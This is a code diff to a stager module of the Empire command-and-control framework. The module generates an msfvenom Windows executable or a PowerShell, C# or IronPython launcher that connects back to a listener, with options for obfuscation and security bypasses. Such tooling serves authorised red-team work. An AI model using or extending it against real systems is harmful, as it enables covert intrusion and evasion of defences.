@@ -1,26 +1,30 @@
 from __future__ import print_function
 
-import socket
+import logging
 import subprocess
-import threading
 from builtins import object
 
 from empire.server.common import helpers
 
+log = logging.getLogger(__name__)
+
 
 class Stager(object):
     def __init__(self, mainMenu, params=[]):
-
         self.info = {
             "Name": "Stage 0 - Cmd Exec",
-            "Author": ["@Cx01N"],
+            "Authors": [
+                {
+                    "Name": "Anthony Rose",
+                    "Handle": "@Cx01N",
+                    "Link": "https://twitter.com/Cx01N_",
+                }
+            ],
             "Description": "Generates windows command executable using msfvenom to act as a stage 0.",
             "Comments": [""],
         }
 
         self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
             "Listener": {
                 "Description": "Listener to generate stager for.",
                 "Required": True,
@@ -30,7 +34,7 @@ class Stager(object):
                 "Description": "Language of the stager to generate.",
                 "Required": True,
                 "Value": "powershell",
-                "SuggestedValues": ["powershell", "python"],
+                "SuggestedValues": ["powershell", "ironpython", "csharp"],
                 "Strict": True,
             },
             "StagerRetries": {
@@ -97,12 +101,9 @@ class Stager(object):
             },
         }
 
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
         self.main_menu = mainMenu
 
         for param in params:
-            # parameter format is [Name, Value]
             option, value = param
             if option in self.options:
                 self.options[option]["Value"] = value
@@ -127,20 +128,40 @@ class Stager(object):
         if obfuscate.lower() == "true":
             invoke_obfuscation = True
 
-        # generate the launcher code
-        self.launcher = self.main_menu.stagers.generate_launcher(
-            listener_name,
-            language=language,
-            encode=encode,
-            obfuscate=invoke_obfuscation,
-            obfuscationCommand=obfuscate_command,
-            userAgent=user_agent,
-            proxy=proxy,
-            proxyCreds=proxy_creds,
-            stagerRetries=stager_retries,
-            safeChecks=safe_checks,
-            bypasses=self.options["Bypasses"]["Value"],
-        )
+        if language in ["csharp", "ironpython"]:
+            if (
+                self.main_menu.listenersv2.get_active_listener_by_name(
+                    listener_name
+                ).info["Name"]
+                != "HTTP[S]"
+            ):
+                log.error(
+                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
+                )
+                return ""
+
+            self.launcher = self.main_menu.stagers.generate_exe_oneliner(
+                language=language,
+                obfuscate=invoke_obfuscation,
+                obfuscation_command=obfuscate_command,
+                encode=encode,
+                listener_name=listener_name,
+            )
+
+        elif language == "powershell":
+            self.launcher = self.main_menu.stagers.generate_launcher(
+                listener_name,
+                language=language,
+                encode=encode,
+                obfuscate=invoke_obfuscation,
+                obfuscation_command=obfuscate_command,
+                userAgent=user_agent,
+                proxy=proxy,
+                proxyCreds=proxy_creds,
+                stagerRetries=stager_retries,
+                safeChecks=safe_checks,
+                bypasses=self.options["Bypasses"]["Value"],
+            )
 
         if self.launcher == "":
             print(helpers.color("[!] Error in launcher command generation."))
